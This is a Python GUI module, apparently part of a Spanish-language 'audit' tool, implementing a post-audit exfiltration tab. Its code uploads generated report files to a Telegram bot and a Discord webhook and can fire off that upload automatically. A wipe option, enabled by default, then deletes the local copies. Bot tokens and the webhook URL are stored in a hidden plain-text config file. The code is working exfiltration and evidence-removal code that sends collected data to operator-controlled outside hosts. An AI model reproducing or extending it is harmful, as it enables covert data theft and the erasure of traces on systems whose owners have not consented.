"""
Tab: Post-Audit
───────────────
Actions to take after a successful audit:
  • Configure Telegram & Discord exfiltration
  • Send reports to configured channels
  • Auto-wipe local files toggle
  • Connection test for each channel
  • Persistence for webhook/token configuration
"""

import threading
import json
import customtkinter as ctk
from pathlib import Path

from gui.theme import (
    COLORS, FONTS, PAD,
    make_card, make_label, make_button, make_entry,
    make_section_header, make_badge, add_clear_button, add_reveal_button
)


class PostAuditView(ctk.CTkScrollableFrame):
    """Exfiltration configuration and dispatch."""

    CONFIG_FILE = Path(".audit/exfil_config.json")

    def __init__(self, parent):
        super().__init__(
            parent, 
            fg_color="transparent",
            scrollbar_button_color=COLORS["accent_dim"],
            scrollbar_button_hover_color=COLORS["accent"]
        )
        self._report_paths: list = []
        self._build_ui()
        self._load_config()

    # ── Public API ────────────────────────────────────────────────────────────

    def set_report_paths(self, html_path, csv_path, json_path=None):
        """Inject report paths after an audit completes."""
        self._report_paths = [Path(p) for p in (html_path, csv_path, json_path) if p and Path(p).exists()]
        count = len(self._report_paths)
        if count:
            self._reports_badge.configure(
                text=f"  {count} reporte(s) listos  ",
                fg_color=COLORS["success_dim"],
                text_color=COLORS["success"],
            )
        else:
            self._reports_badge.configure(
                text="  Sin reportes  ",
                fg_color=COLORS["warning_dim"],
                text_color=COLORS["warning"],
            )

    def trigger_auto_exfiltrate(self):
        """Automated trigger for background sending."""
        has_tg = bool(self._tg_token.get().strip() and self._tg_chat.get().strip())
        has_dc = bool(self._dc_hook.get().strip())
        
        if not has_tg and not has_dc:
            self._log_line("WARN", "Autoexfiltración: No hay canales configurados en el Tab Exfiltración.")
            return

        if not self._report_paths:
            self._log_line("WARN", "Autoexfiltración: No hay archivos de reporte para enviar.")
            return

        self._log_line("SYSTEM", "Autoexfiltración activada: Iniciando envío automático...")
        if has_tg: self._send_telegram()
        if has_dc: self._send_discord()

    # ── UI Construction ───────────────────────────────────────────────────────

    def _build_ui(self):
        # ── Telegram Card ─────────────────────────────────────────────────────
        make_section_header(self, "Exfiltración por Telegram", "✈️")
        tg_card = make_card(self)
        tg_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["sm"]))

        tg_inner = ctk.CTkFrame(tg_card, fg_color="transparent")
        tg_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        r1 = ctk.CTkFrame(tg_inner, fg_color="transparent")
        r1.pack(fill="x", pady=(0, PAD["sm"]))
        make_label(r1, "Bot Token:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._tg_token = make_entry(r1, placeholder="123456:ABC-DEF...", show="*", width=320)
        self._tg_token.pack(side="left", padx=(0, PAD["xs"]))
        add_reveal_button(r1, self._tg_token).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r1, self._tg_token).pack(side="left")

        r2 = ctk.CTkFrame(tg_inner, fg_color="transparent")
        r2.pack(fill="x", pady=(0, PAD["sm"]))
        make_label(r2, "Chat ID:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._tg_chat = make_entry(r2, placeholder="-100123456789", width=320)
        self._tg_chat.pack(side="left", padx=(0, PAD["xs"]))
        add_reveal_button(r2, self._tg_chat).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r2, self._tg_chat).pack(side="left")
        self._tg_status = make_badge(r2, "sin probar", "text_muted")
        self._tg_status.pack(side="left", padx=(PAD["lg"], 0))

        r3 = ctk.CTkFrame(tg_inner, fg_color="transparent")
        r3.pack(fill="x")
        make_button(r3, "🔌 Probar", command=self._test_telegram, style="action",    width=130).pack(side="left", padx=(0, PAD["sm"]))
        make_button(r3, "📤 Enviar", command=self._send_telegram, style="primary",   width=130).pack(side="left", padx=(0, PAD["sm"]))
        make_button(r3, "🗑 Limpiar",  command=self._clear_telegram, style="danger",  width=120).pack(side="left")

        # ── Discord Card ──────────────────────────────────────────────────────
        make_section_header(self, "Exfiltración por Discord", "💬")
        dc_card = make_card(self)
        dc_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["sm"]))

        dc_inner = ctk.CTkFrame(dc_card, fg_color="transparent")
        dc_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        r4 = ctk.CTkFrame(dc_inner, fg_color="transparent")
        r4.pack(fill="x", pady=(0, PAD["sm"]))
        make_label(r4, "Webhook URL:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._dc_hook = make_entry(r4, placeholder="https://discord.com/api/webhooks/...", show="*", width=320)
        self._dc_hook.pack(side="left", padx=(0, PAD["xs"]))
        add_reveal_button(r4, self._dc_hook).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r4, self._dc_hook).pack(side="left")
        self._dc_status = make_badge(r4, "sin probar", "text_muted")
        self._dc_status.pack(side="left", padx=(PAD["lg"], 0))

        r5 = ctk.CTkFrame(dc_inner, fg_color="transparent")
        r5.pack(fill="x")
        make_button(r5, "🔌 Probar", command=self._test_discord, style="action",    width=130).pack(side="left", padx=(0, PAD["sm"]))
        make_button(r5, "📤 Enviar", command=self._send_discord, style="primary",   width=130).pack(side="left", padx=(0, PAD["sm"]))
        make_button(r5, "🗑 Limpiar",   command=self._clear_discord, style="danger",    width=120).pack(side="left")

        # ── Persistence & Options Card ────────────────────────────────────────
        make_section_header(self, "Configuración y Persistencia", "💾")
        opt_card = make_card(self)
        opt_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["sm"]))

        opt_inner = ctk.CTkFrame(opt_card, fg_color="transparent")
        opt_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        # Row 1: Persistence Buttons
        pers_row = ctk.CTkFrame(opt_inner, fg_color="transparent")
        pers_row.pack(fill="x", pady=(0, PAD["md"]))
        
        make_button(pers_row, "💾 Guardar Configuración", command=self._save_config, style="success", width=220).pack(side="left", padx=(0, PAD["sm"]))
        make_button(pers_row, "🔥 Eliminar Datos Guardados", command=self._delete_saved_config, style="danger", width=220).pack(side="left")

        # Row 2: Checkboxes
        check_row = ctk.CTkFrame(opt_inner, fg_color="transparent")
        check_row.pack(fill="x")

        self._wipe_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(
            check_row, text="Auto-wipe: eliminar reportes locales tras exfiltrar",
            variable=self._wipe_var, fg_color=COLORS["accent"], font=FONTS["body"]
        ).pack(side="left", padx=(0, PAD["lg"]))

        self._send_both_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(
            check_row, text="Enviar a todos los canales configurados",
            variable=self._send_both_var, fg_color=COLORS["accent"], font=FONTS["body"]
        ).pack(side="left")

        # ── Status row ────────────────────────────────────────────────────────
        status_row = ctk.CTkFrame(self, fg_color="transparent")
        status_row.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["sm"]))
        make_label(status_row, "Reportes disponibles:", style="small", color=COLORS["text_secondary"]).pack(side="left", padx=(0, PAD["sm"]))
        self._reports_badge = make_badge(status_row, "Sin reportes", "text_muted")
        self._reports_badge.pack(side="left")

        make_button(
            status_row, "📤  Enviar a todos",
            command=self._send_all, style="success", width=160,
        ).pack(side="right", padx=PAD["sm"])

        # ── Log ───────────────────────────────────────────────────────────────
        make_section_header(self, "Log de Exfiltración", "📋")
        log_card = make_card(self)
        log_card.pack(fill="both", expand=True, padx=PAD["lg"], pady=(0, PAD["lg"]))

        log_toolbar = ctk.CTkFrame(log_card, fg_color="transparent")
        log_toolbar.pack(fill="x", padx=PAD["sm"], pady=(PAD["xs"], 0))
        make_button(log_toolbar, "🗑 Limpiar log", command=self._clear_log_box, style="danger", width=120).pack(side="left")

        self._log = ctk.CTkTextbox(
            log_card, fg_color=COLORS["bg_terminal"], text_color=COLORS["text_terminal"],
            font=FONTS["code"], corner_radius=8, border_width=1, border_color=COLORS["border"],
            state="disabled", wrap="word", height=150
        )
        self._log.pack(fill="both", expand=True, padx=PAD["sm"], pady=PAD["sm"])
        self._log._textbox.tag_configure("OK",   foreground=COLORS["success"])
        self._log._textbox.tag_configure("ERR",  foreground=COLORS["danger"])
        self._log._textbox.tag_configure("INFO", foreground=COLORS["info"])
        self._log._textbox.tag_configure("SYSTEM",  foreground=COLORS["accent"])
        self._log._textbox.tag_configure("TIMESTAMP", foreground=COLORS["text_muted"])

        self._log_line("TIMESTAMP", "Esperando configuración de exfiltración…")

    # ── Persistence Logic ────────────────────────────────────────────────────

    def _save_config(self):
        config = {
            "tg_token": self._tg_token.get().strip(),
            "tg_chat":  self._tg_chat.get().strip(),
            "dc_hook":  self._dc_hook.get().strip(),
            "wipe":     self._wipe_var.get(),
            "send_all": self._send_both_var.get()
        }
        try:
            self.CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)
            self.CONFIG_FILE.write_text(json.dumps(config, indent=4), encoding="utf-8")
            self._log_line("OK", "Configuración guardada correctamente en .audit/exfil_config.json")
        except Exception as e:
            self._log_line("ERR", f"Error guardando configuración: {e}")

    def _load_config(self):
        if not self.CONFIG_FILE.exists():
            return
        try:
            config = json.loads(self.CONFIG_FILE.read_text(encoding="utf-8"))
            self._tg_token.delete(0, "end")
            self._tg_token.insert(0, config.get("tg_token", ""))
            self._tg_chat.delete(0, "end")
            self._tg_chat.insert(0, config.get("tg_chat", ""))
            self._dc_hook.delete(0, "end")
            self._dc_hook.insert(0, config.get("dc_hook", ""))
            self._wipe_var.set(config.get("wipe", True))
            self._send_both_var.set(config.get("send_all", True))
            self._log_line("INFO", "Configuración cargada desde .audit/exfil_config.json")
        except Exception as e:
            self._log_line("ERR", f"Error cargando configuración: {e}")

    def _delete_saved_config(self):
        if self.CONFIG_FILE.exists():
            try:
                self.CONFIG_FILE.unlink()
                self._log_line("WARN", "Archivo de configuración eliminado.")
                self._clear_telegram()
                self._clear_discord()
            except Exception as e:
                self._log_line("ERR", f"Error eliminando configuración: {e}")
        else:
            self._log_line("INFO", "No hay configuración guardada para eliminar.")

    # ── Log helper ────────────────────────────────────────────────────────────

    def _log_line(self, tag: str, msg: str):
        from datetime import datetime
        ts = datetime.now().strftime("%H:%M:%S")
        self._log.configure(state="normal")
        self._log._textbox.insert("end", f"[{ts}] ", "TIMESTAMP")
        self._log._textbox.insert("end", msg + "\n", tag)
        self._log._textbox.see("end")
        self._log.configure(state="disabled")

    # ── Clear helpers ─────────────────────────────────────────────────────────

    def _clear_telegram(self):
        self._tg_token.delete(0, "end")
        self._tg_chat.delete(0, "end")
        self._tg_status.configure(text="  sin probar  ", fg_color=COLORS["bg_card"], text_color=COLORS["text_muted"])

    def _clear_discord(self):
        self._dc_hook.delete(0, "end")
        self._dc_status.configure(text="  sin probar  ", fg_color=COLORS["bg_card"], text_color=COLORS["text_muted"])

    def _clear_log_box(self):
        self._log.configure(state="normal")
        self._log.delete("0.0", "end")
        self._log.configure(state="disabled")

    # ── Exfiltration actions ──────────────────────────────────────────────────

    def _get_exfiltrator(self):
        from main import Exfiltrator
        return Exfiltrator(
            telegram_token=self._tg_token.get() or None,
            telegram_chat_id=self._tg_chat.get() or None,
            discord_webhook=self._dc_hook.get() or None,
        )

    def _test_telegram(self):
        token = self._tg_token.get().strip()
        chat  = self._tg_chat.get().strip()
        if not token or ":" not in token:
            self._log_line("ERR", "Telegram: Token inválido")
            return
        if not chat:
            self._log_line("ERR", "Telegram: Chat ID requerido")
            return

        def _do():
            import requests
            self.after(0, lambda: self._tg_status.configure(text="  ⌛ Validando...  ", fg_color=COLORS["accent_dim"], text_color=COLORS["accent"]))
            try:
                r_me = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
                if not r_me.ok:
                    self.after(0, lambda: self._tg_status.configure(text="  ✗ Token Inválido  ", fg_color=COLORS["danger_dim"], text_color=COLORS["danger"]))
                    return
                bot_name = r_me.json().get("result", {}).get("username", "?")
                r_chat = requests.get(f"https://api.telegram.org/bot{token}/getChat", params={"chat_id": chat}, timeout=10)
                if r_chat.ok:
                    chat_title = r_chat.json().get("result", {}).get("title") or r_chat.json().get("result", {}).get("username", "Chat")
                    self.after(0, lambda: self._tg_status.configure(text=f"  ✓ @{bot_name} → {chat_title}  ", fg_color=COLORS["success_dim"], text_color=COLORS["success"]))
                    self.after(0, lambda: self._log_line("OK", f"Telegram Verificado: Bot @{bot_name} en '{chat_title}'"))
                else:
                    self.after(0, lambda: self._tg_status.configure(text="  ✗ Sin Acceso al Chat  ", fg_color=COLORS["warning_dim"], text_color=COLORS["warning"]))
            except Exception as e:
                self.after(0, lambda: self._log_line("ERR", f"Telegram Error: {e}"))
        threading.Thread(target=_do, daemon=True).start()

    def _test_discord(self):
        hook = self._dc_hook.get().strip()
        if not hook or not hook.startswith("https://discord.com/api/webhooks/"):
            self._log_line("ERR", "Discord: URL inválida")
            return

        def _do():
            import requests
            self.after(0, lambda: self._dc_status.configure(text="  ⌛ Validando...  ", fg_color=COLORS["accent_dim"], text_color=COLORS["accent"]))
            try:
                r = requests.get(hook, timeout=10)
                if r.ok:
                    name = r.json().get("name", "Webhook")
                    self.after(0, lambda: self._dc_status.configure(text=f"  ✓ {name} OK  ", fg_color=COLORS["success_dim"], text_color=COLORS["success"]))
                    self.after(0, lambda: self._log_line("OK", f"Discord Verificado: Webhook '{name}' activo"))
                else:
                    self.after(0, lambda: self._dc_status.configure(text=f"  ✗ Error {r.status_code}  ", fg_color=COLORS["danger_dim"], text_color=COLORS["danger"]))
            except Exception as e:
                self.after(0, lambda: self._log_line("ERR", f"Discord Error: {e}"))
        threading.Thread(target=_do, daemon=True).start()

    def _send_telegram(self):
        if not self._report_paths:
            self._log_line("ERR", "No hay reportes listos.")
            return
        exf = self._get_exfiltrator()
        def _do():
            for p in self._report_paths:
                ok = exf.send_to_telegram(p)
                m = f"Telegram {'✓' if ok else '✗'} {p.name}"
                tag = "OK" if ok else "ERR"
                self.after(0, lambda m=m, t=tag: self._log_line(t, m))
            if self._wipe_var.get(): self._wipe_files()
        threading.Thread(target=_do, daemon=True).start()

    def _send_discord(self):
        if not self._report_paths:
            self._log_line("ERR", "No hay reportes listos.")
            return
        exf = self._get_exfiltrator()
        def _do():
            for p in self._report_paths:
                ok = exf.send_to_discord(p)
                m = f"Discord {'✓' if ok else '✗'} {p.name}"
                tag = "OK" if ok else "ERR"
                self.after(0, lambda m=m, t=tag: self._log_line(t, m))
            if self._wipe_var.get(): self._wipe_files()
        threading.Thread(target=_do, daemon=True).start()

    def _send_all(self):
        self._send_telegram()
        if self._send_both_var.get(): self._send_discord()

    def _wipe_files(self):
        wiped = []
        for p in self._report_paths:
            try:
                p.unlink(missing_ok=True)
                wiped.append(p.name)
            except: pass
        if wiped: self.after(0, lambda: self._log_line("OK", f"Wipe local: {', '.join(wiped)}"))
        self._report_paths = []
        self.after(0, lambda: self._reports_badge.configure(text="  Sin reportes  ", fg_color=COLORS["warning_dim"], text_color=COLORS["warning"]))
